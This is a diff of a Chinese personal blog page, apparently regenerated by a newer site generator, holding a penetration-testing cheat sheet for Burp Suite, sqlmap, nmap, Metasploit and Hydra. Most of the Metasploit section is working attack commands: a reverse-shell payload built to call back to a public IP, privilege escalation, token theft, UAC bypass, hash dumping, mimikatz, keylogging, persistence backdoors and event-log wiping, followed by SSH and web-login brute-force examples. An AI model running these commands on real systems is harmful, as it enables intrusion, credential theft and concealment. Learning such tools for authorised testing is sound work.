@@ -2,7 +2,7 @@
 <html lang="en">
 
 <!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.8.0">
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,14 +25,20 @@
     <link rel="canonical" href="https://pengpengp.github.io/2019/03/16/常用渗透工具/">
 
     <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
 
     <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
 
     <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
-</head>
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <style>
 
@@ -43,8 +49,8 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
-" data-ishome="false">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -119,7 +125,8 @@
 <!--only post-->
 
 
-<img class="wechat-title-img" src="">
+<img class="wechat-title-img"
+     src="">
 
 
 <style>
@@ -146,7 +153,8 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#常用工具及使用" title="常用工具及使用">常用工具及使用</a>
+                        <a class="tag" href="/tags/#常用工具及使用"
+                           title="常用工具及使用">常用工具及使用</a>
                         
                     </div>
                 </div>
@@ -166,124 +174,123 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h3 id="web测试常用工具整理"><a href="#web测试常用工具整理" class="headerlink" title="web测试常用工具整理:"></a>web测试常用工具整理:</h3><h3 id="一-burpsuite"><a href="#一-burpsuite" class="headerlink" title="一.burpsuite"></a>一.burpsuite</h3><p>1.Macros模块:project-&gt;macros爆破数字验证码:<a href="https://blog.csdn.net/d_pokemon/article/details/78194351" target="_blank" rel="noopener">https://blog.csdn.net/d_pokemon/article/details/78194351</a></p>
+                <h3 id="web测试常用工具整理"><a href="#web测试常用工具整理" class="headerlink" title="web测试常用工具整理:"></a>web测试常用工具整理:</h3><h3 id="一-burpsuite"><a href="#一-burpsuite" class="headerlink" title="一.burpsuite"></a>一.burpsuite</h3><p>1.Macros模块:project-&gt;macros爆破数字验证码:<a target="_blank" rel="noopener" href="https://blog.csdn.net/d_pokemon/article/details/78194351">https://blog.csdn.net/d_pokemon/article/details/78194351</a></p>
 <p> 2.intruder模块四种攻击方式:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sniper(单字典顺序爆破):常用</span><br><span class="line">battering ram(单字典赋予所有变量取相同值)</span><br><span class="line">pitchfork(双字典同时顺序爆破)</span><br><span class="line">cluster bomb(多字典混合爆破).常用***</span><br></pre></td></tr></table></figure>
+
 <p>3.Proxy代理功能:User options-&gt;socks proxy</p>
-<p>参考:<a href="https://blog.csdn.net/snert/article/details/49749757(爆破数字验证码讲解)" target="_blank" rel="noopener">https://blog.csdn.net/snert/article/details/49749757(爆破数字验证码讲解)</a><br>    <a href="https://blog.csdn.net/xiaohua_de/article/details/80290882(爆破方式图解)" target="_blank" rel="noopener">https://blog.csdn.net/xiaohua_de/article/details/80290882(爆破方式图解)</a></p>
+<p>参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/snert/article/details/49749757(%E7%88%86%E7%A0%B4%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AE%B2%E8%A7%A3)">https://blog.csdn.net/snert/article/details/49749757(爆破数字验证码讲解)</a><br>    <a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaohua_de/article/details/80290882(%E7%88%86%E7%A0%B4%E6%96%B9%E5%BC%8F%E5%9B%BE%E8%A7%A3)">https://blog.csdn.net/xiaohua_de/article/details/80290882(爆破方式图解)</a></p>
 <h3 id="二-sqlmap参数"><a href="#二-sqlmap参数" class="headerlink" title="二.sqlmap参数"></a>二.sqlmap参数</h3><table>
 <thead>
 <tr>
-<th style="text-align:left">命令</th>
+<th align="left">命令</th>
 <th>解释</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td style="text-align:left"><code>-u &quot;地址&quot;</code></td>
+<tbody><tr>
+<td align="left"><code>-u &quot;地址&quot;</code></td>
 <td>指定存在注入的url</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--dbms</code></td>
+<td align="left"><code>--dbms</code></td>
 <td>指定数据库类型</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--dbms-cred=DBMS.</code>&nbsp;&nbsp;&nbsp;</td>
+<td align="left"><code>--dbms-cred=DBMS.</code>&nbsp;&nbsp;&nbsp;</td>
 <td>数据库的认证,例子:–dbms-cred=”name:password”</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--dbs</code></td>
+<td align="left"><code>--dbs</code></td>
 <td>搜索所有库</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>-D</code></td>
+<td align="left"><code>-D</code></td>
 <td>指定某个数据库</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>-table</code></td>
+<td align="left"><code>-table</code></td>
 <td>搜索所有表</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>-T</code></td>
+<td align="left"><code>-T</code></td>
 <td>指定某个表</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>-column</code></td>
+<td align="left"><code>-column</code></td>
 <td>搜搜所有字段</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>-C</code></td>
+<td align="left"><code>-C</code></td>
 <td>指定某个字段</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>-dump</code></td>
+<td align="left"><code>-dump</code></td>
 <td>提取当前数据</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>-v</code></td>
+<td align="left"><code>-v</code></td>
 <td>显示信息[1-6]</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--users</code></td>
+<td align="left"><code>--users</code></td>
 <td>查询一共都有哪些用户，常用，直接用–users</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--passwords</code></td>
+<td align="left"><code>--passwords</code></td>
 <td>查询用户密码的哈希，常用，直接用–passwords</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--privileges</code></td>
+<td align="left"><code>--privileges</code></td>
 <td>查看特权，常用。例 –privileges -U username (CU 就是当前用户)</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--method=</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+<td align="left"><code>--method=</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
 <td>指定提交方式—-例子–method=GET –method=POST</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>–proxy</code></td>
+<td align="left"><code>–proxy</code></td>
 <td>使用代理,例子</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>–prefix</code></td>
+<td align="left"><code>–prefix</code></td>
 <td>增加前缀,例子</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--suffix</code></td>
+<td align="left"><code>--suffix</code></td>
 <td>增加后缀</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--level</code></td>
+<td align="left"><code>--level</code></td>
 <td>设置测试的等级[1-5],默认1</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--technique=TECH</code>&nbsp;&nbsp;&nbsp;</td>
+<td align="left"><code>--technique=TECH</code>&nbsp;&nbsp;&nbsp;</td>
 <td>指定所使用的技术（B:布尔盲注;E:报错注入;U:联合查询注入;S:文件系统，操作系统，注册表相关注入;T:时间盲注; 默认全部使用）</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--time-sec=TIMESEC</code>&nbsp;&nbsp;</td>
+<td align="left"><code>--time-sec=TIMESEC</code>&nbsp;&nbsp;</td>
 <td>在基于时间的盲注的时候，指定判断的时间，单位秒，默认5秒。</td>
 </tr>
 <tr>
-<td style="text-align:left"><code>--dns-domain=DNS..</code></td>
+<td align="left"><code>--dns-domain=DNS..</code></td>
 <td>如果你控制了一台dns服务器，使用这个可以提高效率,例子:–dns-domain 123.com</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <blockquote>
 <p>高级:</p>
-<p><code>--tamper &quot;*.py&quot;</code>:使用绕过脚本<br>    —-例子:charencode.py/charunicodeencode.py:重要<strong>*</strong></p>
-<p><code>--cookie</code>:指定cookie值:重要<br>    —-例子:-u “<a href="http://www.abc.com/index.php?id=1&quot;" target="_blank" rel="noopener">www.abc.com/index.php?id=1&quot;</a> –cookie=”a=1;b=2”</p>
+<p><code> --tamper &quot;*.py&quot;</code>:使用绕过脚本<br>    —-例子:charencode.py/charunicodeencode.py:重要*****</p>
+<p><code>--cookie</code>:指定cookie值:重要<br>    —-例子:-u “<a target="_blank" rel="noopener" href="http://www.abc.com/index.php?id=1&quot;">www.abc.com/index.php?id=1&quot;</a> –cookie=”a=1;b=2”</p>
 <p><code>--user-agent</code>:指定user-agent内容</p>
 <p><code>--host</code>:指定host内容</p>
 <p><code>--referer</code>:指定referer</p>
-<p><code>-H --headers</code> 额外的header头:重要<br>        —-例子:–headers=”host:<a href="http://www.a.com\nUser-Agent:yuangh&quot;" target="_blank" rel="noopener">www.a.com\nUser-Agent:yuangh&quot;</a></p>
+<p><code>-H --headers</code> 额外的header头:重要<br>        —-例子:–headers=”host:<a target="_blank" rel="noopener" href="http://www.a.com/nUser-Agent:yuangh&quot;">www.a.com\nUser-Agent:yuangh&quot;</a></p>
 <p><code>--ignore-proxy</code> 无视本地的代理</p>
 <p><code>--ignore-redirects</code> 无视http重定向，比如登录成功会跳转到其他网页，可使用这个忽略掉。</p>
 <p><code>--timeout=TIMEOUT</code> 请求超时的时间，单位为秒，浮点数，默认30s。</p>
 <p><code>-f</code>:指纹信息，返回DBMS，操作系统，架构，补丁等信息。</p>
 <p><code>–tor :-tor-port</code>:手动设置TOR代理，</p>
-<p><code>-tor-type</code>:检查你的代理是否被正确地安装并正常的工作<br>        —-安装:sudo apt-get install tor tor-geoip<br>        —-举例:进入sqlmap的目录后:./sqlmap.py -u “<a href="http://www.targetvuln.com/index/php?cata_id=1&quot;" target="_blank" rel="noopener">http://www.targetvuln.com/index/php?cata_id=1&quot;</a> -b -a -tor </p>
-<p><code>–check-tor–user-agent</code>=”Mozilla/5.0(compatible;Googlebot/2.1;+<a href="http://www.google.com/bot.html)&quot;" target="_blank" rel="noopener">http://www.google.com/bot.html)&quot;</a></p>
+<p><code>-tor-type</code>:检查你的代理是否被正确地安装并正常的工作<br>        —-安装:sudo apt-get install tor tor-geoip<br>        —-举例:进入sqlmap的目录后:./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.targetvuln.com/index/php?cata_id=1&quot;">http://www.targetvuln.com/index/php?cata_id=1&quot;</a> -b -a -tor </p>
+<p><code>–check-tor–user-agent</code>=”Mozilla/5.0(compatible;Googlebot/2.1;+<a target="_blank" rel="noopener" href="http://www.google.com/bot.html)&quot;">http://www.google.com/bot.html)&quot;</a></p>
 <p>shell</p>
 <p> <code>--os-cmd=OSCMD</code> 执行一句系统命令。<br>        —-举例:–os-shell=”ipconfig -all”</p>
 <p><code>--os-shell</code> 创建一个对方操作系统的shell，远程执行系统命令</p>
@@ -302,13 +309,12 @@
 <th>解释</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td><code>-p1-65535</code>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+<tbody><tr>
+<td><code>-p1-65535 </code>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
 <td>扫描指定端口</td>
 </tr>
 <tr>
-<td><code>-p2,3,4</code></td>
+<td><code> -p2,3,4</code></td>
 <td>10.0.1.161   -p20-200,7777,8888 指定不连续端口</td>
 </tr>
 <tr>
@@ -340,16 +346,16 @@
 <td>仅探测是否在线</td>
 </tr>
 <tr>
-<td><code>-sT/sU/sS</code></td>
+<td><code>-sT/sU/sS   </code></td>
 <td>TCP/UDP/半开放扫描</td>
 </tr>
 <tr>
 <td><code>-sL</code></td>
-<td>(Idlescan)使用另外一个目标网络的主机发送数据包.隐藏自己ip:重要<em>**</em></td>
+<td>(Idlescan)使用另外一个目标网络的主机发送数据包.隐藏自己ip:重要****</td>
 </tr>
 <tr>
 <td><code>--iflist</code></td>
-<td>检测主机接口和路由信息:重要<em>**</em></td>
+<td>检测主机接口和路由信息:重要****</td>
 </tr>
 <tr>
 <td><code>-iL</code></td>
@@ -363,8 +369,7 @@
 <td><code>-r</code></td>
 <td>顺序端口扫描(扫所有端口)</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>​    常用</p>
 <table>
 <thead>
@@ -373,9 +378,8 @@
 <th>解释</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td><code>, -</code></td>
+<tbody><tr>
+<td><code>, - </code></td>
 <td>用空格或-或,-例子:nmap 10.0.1.161  10.0.1.162   nmap 10.0.1.161-162     nmap 10.0.1.161,162</td>
 </tr>
 <tr>
@@ -410,112 +414,108 @@
 <td><code>-bFTP</code></td>
 <td>反弹攻击(bounceattack)**</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>端口状态:</p>
 <table>
 <thead>
 <tr>
-<th style="text-align:center">命令</th>
+<th align="center">命令</th>
 <th>解释</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td style="text-align:center">open</td>
+<tbody><tr>
+<td align="center">open</td>
 <td>应用程序在该端口接收 TCP 连接或者 UDP 报文。</td>
 </tr>
 <tr>
-<td style="text-align:center">closed</td>
+<td align="center">closed</td>
 <td>关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</td>
 </tr>
 <tr>
-<td style="text-align:center">filtered</td>
+<td align="center">filtered</td>
 <td>由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</td>
 </tr>
 <tr>
-<td style="text-align:center">unfiltered</td>
+<td align="center">unfiltered</td>
 <td>未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</td>
 </tr>
 <tr>
-<td style="text-align:center">open</td>
+<td align="center">open</td>
 <td>filtered</td>
 </tr>
 <tr>
-<td style="text-align:center">closed</td>
+<td align="center">closed</td>
 <td>filtered</td>
 </tr>
-</tbody>
-</table>
-<p>参考文档:<a href="https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html深度剖析了nmap" target="_blank" rel="noopener">https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html深度剖析了nmap</a></p>
+</tbody></table>
+<p>参考文档:<a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E4%BA%86nmap">https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html深度剖析了nmap</a></p>
 <h3 id="四-MSF"><a href="#四-MSF" class="headerlink" title="四.MSF"></a>四.MSF</h3><p>​    </p>
 <ul>
 <li><p>1.生成windows下的exe反弹木马<br>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe &gt; 8888.exe</p>
-<pre><code>// -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; = &gt;
-</code></pre></li>
+<pre><code>        // -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; = &gt;</code></pre>
+</li>
 <li><p>生成linux的反弹elf木马</p>
 <p>  msf5 &gt; use payload/linux/x64/meterpreter/reverse_tcp<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lhost 192.168.5.187<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lport 20000<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; generate -h<br>  generate -f elf -o ~/Desktop/centos.elf</p>
 </li>
 <li><p>2.监听<br>  use exploit/multi/handler</p>
-<pre><code>set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 172.17.150.246 //阿里云云服务器这里是内网ip
-set LPORT 8888
-exploit -j
-</code></pre></li>
+<pre><code>        set PAYLOAD windows/meterpreter/reverse_tcp
+        set LHOST 172.17.150.246 //阿里云云服务器这里是内网ip
+        set LPORT 8888
+        exploit -j</code></pre>
+</li>
 <li><p>3.内网代理    首先需要链接sessions,在此基础下添加路由<br>  meterpreter &gt; run get_local_subnets //获取网段</p>
-<pre><code>meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由
-meterpreter &gt; run autoroute -p //查看路由
-meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段
-meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。
-meterpreter &gt; background //后台sessions
-</code></pre></li>
+<pre><code>        meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由
+        meterpreter &gt; run autoroute -p //查看路由
+        meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段
+        meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。
+        meterpreter &gt; background //后台sessions</code></pre>
+</li>
 <li><p>4.提权<br>  (1)getsystem</p>
-<pre><code>meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法
-(2)使用exp提权
-meterpreter &gt; background //先后台运行会话
-[*] Backgrounding session 1…
-msf &gt; use post/windows/escalate/ms10_073_kbdlayout
-msf &gt; show options
-msf &gt; set session 1 //设置要使用的会话
-msf post(ms10_073_kbdlayout) &gt; exploit
-注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。
-或者直接：
-meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout
-(3)盗取令牌
-meterpreter &gt; use incognito //进入这个模块
-meterpreter &gt; list_tokens –u //查看存在的令牌
-meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠
-(4)过UAC
-msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样
-msf &gt; show options
-msf &gt; set session 4
-msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权
-(5)Hash
-meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。
-</code></pre></li>
+<pre><code>        meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法
+        (2)使用exp提权
+        meterpreter &gt; background //先后台运行会话
+        [*] Backgrounding session 1…
+        msf &gt; use post/windows/escalate/ms10_073_kbdlayout
+        msf &gt; show options
+        msf &gt; set session 1 //设置要使用的会话
+        msf post(ms10_073_kbdlayout) &gt; exploit
+        注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。
+        或者直接：
+        meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout
+        (3)盗取令牌
+        meterpreter &gt; use incognito //进入这个模块
+        meterpreter &gt; list_tokens –u //查看存在的令牌
+        meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠
+        (4)过UAC
+        msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样
+        msf &gt; show options
+        msf &gt; set session 4
+        msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权
+        (5)Hash
+        meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。</code></pre>
+</li>
 <li><p>5.留后门<br>(1)服务留后门：</p>
-<pre><code>    meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole
-    msf &gt; use exploit/multi/handler //新终端中监听
-    msf &gt; set payload windows/metsvc_bind_tcp
-    msf &gt; set LPORT 31337
-    msf &gt; set RHOST 192.168.0.128
-    msf &gt; run //获取到的会话是system权限
-(2)启动项后门：
-    meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105
-</code></pre><p>​        // -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。</p>
-<p>​        <code>注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。
-​        缺点：容易被杀毒软件杀 。</code></p>
+<pre><code>          meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole
+          msf &gt; use exploit/multi/handler //新终端中监听
+          msf &gt; set payload windows/metsvc_bind_tcp
+          msf &gt; set LPORT 31337
+          msf &gt; set RHOST 192.168.0.128
+          msf &gt; run //获取到的会话是system权限
+      (2)启动项后门：
+          meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105</code></pre>
+<p>​        // -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。</p>
+<p>​        <code>注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。 ​        缺点：容易被杀毒软件杀 。</code></p>
 </li>
 <li><p>6.爆破ssh<br> use auxiliary/scanner/ssh/ssh_login</p>
-<pre><code>set rhosts 7.7.7.20
-set username root
-set pass_file /root/pass.txt //加载字典，可以收集密码做字典
-set threads 50
-run
-</code></pre></li>
+<pre><code>   set rhosts 7.7.7.20
+   set username root
+   set pass_file /root/pass.txt //加载字典，可以收集密码做字典
+   set threads 50
+   run</code></pre>
+</li>
 <li><p>7.nmap扫描基本信息<br> msf &gt; nmap –script=vuln 受害靶机ip地址</p>
-<pre><code>msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..
-</code></pre></li>
+<pre><code>   msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..</code></pre>
+</li>
 <li><p>8.清除记录<br> msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。</p>
 </li>
 </ul>
@@ -527,8 +527,7 @@ run
 <th>解释</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>截图</td>
 <td><code>screenshot</code></td>
 </tr>
@@ -546,15 +545,14 @@ run
 </tr>
 <tr>
 <td>加载mimikatz模块</td>
-<td><code>meterpreter &gt; load mimikatz meterpreter &gt; wdigest</code>//需要system权限</td>
+<td><code>meterpreter &gt; load mimikatz meterpreter &gt; wdigest </code>//需要system权限</td>
 </tr>
 <tr>
 <td>获取键盘记录</td>
 <td><code>meterpreter&gt; run post/windows/capture/keylog_recorder</code> //运行键盘记录模块，他自己创建本文。</td>
 </tr>
-</tbody>
-</table>
-<p>msf部分取自：<a href="http://www.cnblogs.com/hookjoy/p/7989715.html" target="_blank" rel="noopener">http://www.cnblogs.com/hookjoy/p/7989715.html</a>        </p>
+</tbody></table>
+<p>msf部分取自：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/hookjoy/p/7989715.html">http://www.cnblogs.com/hookjoy/p/7989715.html</a>        </p>
 <h3 id="五Hydra"><a href="#五Hydra" class="headerlink" title="五Hydra"></a>五Hydra</h3><table>
 <thead>
 <tr>
@@ -562,8 +560,7 @@ run
 <th>用途</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>-R</td>
 <td>根据上一次进度继续破解</td>
 </tr>
@@ -615,8 +612,7 @@ run
 <td>-f</td>
 <td>一旦破解成功就停止</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>实例：</p>
 <table>
 <thead>
@@ -625,8 +621,7 @@ run
 <th>实例</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>破解ssh的密码</td>
 <td>hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</td>
 </tr>
@@ -674,8 +669,7 @@ run
 <td>post方式提交，破解web登录2</td>
 <td>index.php:name=^USER^&amp;pwd=^PASS^:<code>&lt;title&gt;invalido&lt;/title&gt;</code></td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 
                 <hr>
                 
@@ -683,12 +677,14 @@ run
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/03/24/域渗透/" data-toggle="tooltip" data-placement="top" title="域渗透">&larr; Previous Post</a>
+                        <a href="/2019/03/24/域渗透/" data-toggle="tooltip" data-placement="top"
+                           title="域渗透">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2019/03/10/内网穿透工具/" data-toggle="tooltip" data-placement="top" title="内网穿透工具">Next Post &rarr;</a>
+                        <a href="/2019/03/10/内网穿透工具/" data-toggle="tooltip" data-placement="top"
+                           title="内网穿透工具">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -707,7 +703,7 @@ run
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web测试常用工具整理"><span class="toc-text">web测试常用工具整理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一-burpsuite"><span class="toc-text">一.burpsuite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二-sqlmap参数"><span class="toc-text">二.sqlmap参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三-nmap"><span class="toc-text">三.nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四-MSF"><span class="toc-text">四.MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五Hydra"><span class="toc-text">五Hydra</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86"><span class="toc-text">web测试常用工具整理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-burpsuite"><span class="toc-text">一.burpsuite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-sqlmap%E5%8F%82%E6%95%B0"><span class="toc-text">二.sqlmap参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-nmap"><span class="toc-text">三.nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-MSF"><span class="toc-text">四.MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94Hydra"><span class="toc-text">五Hydra</span></a></li></ol>
                 </div>
             </div>
         </div>
@@ -759,11 +755,11 @@ run
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    Copyright &copy; pengpengp&#39;s BLOG 2020
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
                 </p>
 
             </div>
@@ -772,13 +768,19 @@ run
 </footer>
 
 <!-- jQuery -->
+
 <script src="/js/jquery.min.js"></script>
 
+
 <!-- Bootstrap Core JavaScript -->
+
 <script src="/js/bootstrap.min.js"></script>
 
+
 <!-- Custom Theme JavaScript -->
+
 <script src="/js/blog.js"></script>
+
 
 <!-- async load function -->
 <script>
